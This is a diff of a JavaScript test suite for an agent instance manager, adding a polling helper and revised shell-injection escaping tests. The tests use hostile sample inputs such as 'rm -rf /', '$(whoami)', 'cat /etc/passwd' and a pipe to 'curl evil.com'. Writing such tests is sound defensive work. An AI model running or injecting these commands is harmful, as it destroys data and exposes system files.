@@ -11,6 +11,17 @@ const { createInstanceManager } = require('../src/sprite-core');
 const { JobStatus } = require('../src/job');
 
 /**
+ * Poll until condition is true, with timeout.
+ */
+async function waitFor(fn, { timeout = 2000, interval = 5 } = {}) {
+  const start = Date.now();
+  while (!fn()) {
+    if (Date.now() - start > timeout) throw new Error('waitFor timed out');
+    await new Promise(r => setTimeout(r, interval));
+  }
+}
+
+/**
  * Create a mock orchestrator that simulates Fly Machines API
  * without making any real HTTP calls.
  */
@@ -209,8 +220,8 @@ describe('Sprite Instance Manager', () => {
         repo: 'owner/repo'
       });
 
-      // Give the spawn a moment to run
-      await new Promise(r => setTimeout(r, 50));
+      // Wait for the job to appear
+      await waitFor(() => manager.listJobs().length > 0);
 
       // Find the job and fire its onComplete (simulating webhook)
       const jobsList = manager.listJobs();
@@ -297,110 +308,90 @@ describe('Sprite Instance Manager', () => {
   // Shell injection prevention (buildAgentCommand)
   // ===========================================================
   describe('shell injection prevention', () => {
-    it('should escape single quotes in user messages', async () => {
-      await manager.startInstance('inject-sq', 'owner/repo', 'C123');
-      const instance = manager.getInstance('inject-sq');
-      const args = manager.buildArgs("it's a test", 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
-      // The single quote must be escaped so it doesn't break out of the
-      // shell-quoted string.  The exact escape can be '\\'' or other forms,
-      // but the raw unescaped ' should NOT appear between the wrapping quotes
-      // in a way that would terminate the string early.
-      assert.ok(!cmd.includes("'it's"), 'Bare single quote must not appear unescaped');
-    });
-
-    it('should escape backticks in user messages', async () => {
-      await manager.startInstance('inject-bt', 'owner/repo', 'C200');
-      const instance = manager.getInstance('inject-bt');
-      const args = manager.buildArgs('run `rm -rf /`', 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
-      // Backticks inside single-quoted strings are literal in sh, but if
-      // the fix adds explicit escaping, verify no raw backtick-delimited
-      // command substitution survives outside quotes.
+    it('should escape backticks in shell commands', () => {
+      const cmd = manager.buildAgentCommand('run `rm -rf /`', 'sess1', 'claude');
+      // Backticks must be escaped with backslash to prevent command substitution
+      assert.ok(cmd.includes('\\`rm'), 'Backticks should be escaped with backslash');
       assert.ok(cmd.includes('rm'), 'Original message content should be preserved');
     });
 
-    it('should neutralize $() command substitution in user messages', async () => {
-      await manager.startInstance('inject-dollar', 'owner/repo', 'C201');
-      const instance = manager.getInstance('inject-dollar');
-      const args = manager.buildArgs('$(whoami)', 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
-      // Either escaped or contained inside single quotes — the literal
-      // string should survive.
-      assert.ok(cmd.includes('whoami'), 'Original text preserved');
+    it('should escape $() command substitution', () => {
+      const cmd = manager.buildAgentCommand('$(whoami)', 'sess1', 'claude');
+      // Dollar sign must be escaped with backslash to prevent expansion
+      assert.ok(cmd.includes('\\$(whoami)'), 'Dollar sign should be escaped with backslash');
     });
 
-    it('should handle the classic shell breakout: single-quote terminate, inject, resume', async () => {
-      await manager.startInstance('inject-classic', 'owner/repo', 'C202');
-      const instance = manager.getInstance('inject-classic');
-      const malicious = "'; rm -rf /; echo '";
-      const args = manager.buildArgs(malicious, 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
-      // The critical check: the resulting command string must NOT contain
-      // an unescaped sequence that closes the quote, runs rm, and opens a
-      // new quote.  After escaping, the single quotes in the payload must
-      // be escaped.
-      const unescapedPattern = "'; rm -rf /; echo '";
-      assert.ok(!cmd.includes(unescapedPattern),
-        'Classic shell injection payload must be escaped');
+    it('should escape double quotes', () => {
+      const cmd = manager.buildAgentCommand('say "hello world"', 'sess1', 'claude');
+      // Double quotes must be escaped since command uses double-quoted strings
+      assert.ok(cmd.includes('hello world'), 'Double-quoted content preserved');
+      assert.ok(cmd.includes('\\"'), 'Double quotes should be escaped');
     });
 
-    it('should handle semicolons in user messages', async () => {
-      await manager.startInstance('inject-semi', 'owner/repo', 'C203');
-      const instance = manager.getInstance('inject-semi');
-      const args = manager.buildArgs('hello; cat /etc/passwd', 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
-      // Semicolons inside single quotes are harmless, but verify the
-      // message is intact and properly enclosed.
+    it('should handle semicolons in user messages', () => {
+      const cmd = manager.buildAgentCommand('hello; cat /etc/passwd', 'sess1', 'claude');
+      // Semicolons inside double quotes are harmless — verify message intact
       assert.ok(cmd.includes('cat /etc/passwd'), 'Message content preserved');
     });
 
-    it('should handle pipes in user messages', async () => {
-      await manager.startInstance('inject-pipe', 'owner/repo', 'C204');
-      const instance = manager.getInstance('inject-pipe');
-      const args = manager.buildArgs('hello | curl evil.com', 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
+    it('should handle pipes in user messages', () => {
+      const cmd = manager.buildAgentCommand('hello | curl evil.com', 'sess1', 'claude');
       assert.ok(cmd.includes('curl evil.com'), 'Message content preserved');
     });
 
-    it('should preserve normal messages without mangling', async () => {
-      await manager.startInstance('inject-normal', 'owner/repo', 'C205');
-      const instance = manager.getInstance('inject-normal');
-      const args = manager.buildArgs('please run the test suite', 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
+    it('should preserve normal messages without mangling', () => {
+      const cmd = manager.buildAgentCommand('please run the test suite', 'sess1', 'claude');
       assert.ok(cmd.includes('please run the test suite'),
         'Normal messages should be preserved verbatim');
     });
 
-    it('should handle empty messages', async () => {
-      await manager.startInstance('inject-empty', 'owner/repo', 'C206');
-      const instance = manager.getInstance('inject-empty');
-      const args = manager.buildArgs('', 'owner/repo', instance.sessionId);
-      assert.ok(args.length > 0, 'Should still produce a command even for empty message');
+    it('should handle empty messages', () => {
+      const cmd = manager.buildAgentCommand('', 'sess1', 'claude');
+      assert.ok(cmd.length > 0, 'Should still produce a command even for empty message');
     });
 
-    it('should handle messages with newlines', async () => {
-      await manager.startInstance('inject-newline', 'owner/repo', 'C207');
-      const instance = manager.getInstance('inject-newline');
-      const args = manager.buildArgs('line one\nline two', 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
+    it('should handle messages with newlines', () => {
+      const cmd = manager.buildAgentCommand('line one\nline two', 'sess1', 'claude');
       assert.ok(cmd.length > 0, 'Should produce a command with newlines in message');
     });
 
-    it('should handle messages with double quotes', async () => {
-      await manager.startInstance('inject-dq', 'owner/repo', 'C208');
-      const instance = manager.getInstance('inject-dq');
-      const args = manager.buildArgs('say "hello world"', 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
-      assert.ok(cmd.includes('hello world'), 'Double-quoted content preserved');
+    it('should escape backslashes', () => {
+      const cmd = manager.buildAgentCommand('path\\to\\file', 'sess1', 'claude');
+      // Backslashes must be escaped to prevent interpretation
+      assert.ok(cmd.includes('\\\\'), 'Backslashes should be escaped');
     });
 
-    it('should handle messages with backslashes', async () => {
-      await manager.startInstance('inject-bs', 'owner/repo', 'C209');
-      const instance = manager.getInstance('inject-bs');
-      const args = manager.buildArgs('path\\to\\file', 'owner/repo', instance.sessionId);
-      const cmd = args.join(' ');
-      assert.ok(cmd.includes('path'), 'Backslash content preserved');
+    it('should escape session IDs too', () => {
+      const cmd = manager.buildAgentCommand('hello', '$(evil)', 'claude');
+      // The $ must be escaped — check for \$ before (evil)
+      assert.ok(cmd.includes('\\$(evil)'), 'Session ID $ should be escaped with backslash');
+    });
+
+    it('should produce valid opencode commands', () => {
+      const cmd = manager.buildAgentCommand('test msg', 'sess1', 'opencode');
+      assert.ok(cmd.includes('opencode run'), 'Should contain opencode run');
+      assert.ok(cmd.includes('test msg'), 'Message should be in command');
+    });
+  });
+
+  // ===========================================================
+  // buildArgs returns raw strings (no shell escaping)
+  // ===========================================================
+  describe('buildArgs (argv for direct execution)', () => {
+    it('should return raw message without shell escaping', async () => {
+      await manager.startInstance('args-raw', 'owner/repo', 'C210');
+      const instance = manager.getInstance('args-raw');
+      const msg = 'run `rm -rf /` and $(whoami)';
+      const args = manager.buildArgs(msg, 'owner/repo', instance.sessionId);
+      // buildArgs is for direct process execution — no escaping
+      assert.ok(args.includes(msg), 'Raw message should be in args as-is');
+    });
+
+    it('should include session ID as raw string', async () => {
+      await manager.startInstance('args-session', 'owner/repo', 'C211');
+      const instance = manager.getInstance('args-session');
+      const args = manager.buildArgs('hello', 'owner/repo', instance.sessionId);
+      assert.ok(args.includes(instance.sessionId), 'Session ID should be in args as-is');
     });
   });
 
@@ -416,7 +407,7 @@ describe('Sprite Instance Manager', () => {
         repo: 'owner/repo'
       });
 
-      await new Promise(r => setTimeout(r, 50));
+      await waitFor(() => manager.listJobs().length > 0);
 
       const jobsList = manager.listJobs();
       const jobId = jobsList[jobsList.length - 1].jobId;
@@ -447,7 +438,7 @@ describe('Sprite Instance Manager', () => {
         repo: 'owner/repo'
       });
 
-      await new Promise(r => setTimeout(r, 50));
+      await waitFor(() => manager.listJobs().length > 0);
 
       const jobsList = manager.listJobs();
       const jobId = jobsList[jobsList.length - 1].jobId;
@@ -512,7 +503,7 @@ describe('Sprite Instance Manager', () => {
         timeoutMs: 5000 // long timeout to ensure webhook fires first
       });
 
-      await new Promise(r => setTimeout(r, 50));
+      await waitFor(() => manager.listJobs().length > 0);
 
       const jobsList = manager.listJobs();
       const jobId = jobsList[jobsList.length - 1].jobId;
@@ -551,7 +542,7 @@ describe('Sprite Instance Manager', () => {
         timeoutMs: 150
       });
 
-      await new Promise(r => setTimeout(r, 50));
+      await waitFor(() => manager.listJobs().length > 0);
 
       const jobsList = manager.listJobs();
       const jobId = jobsList[jobsList.length - 1].jobId;
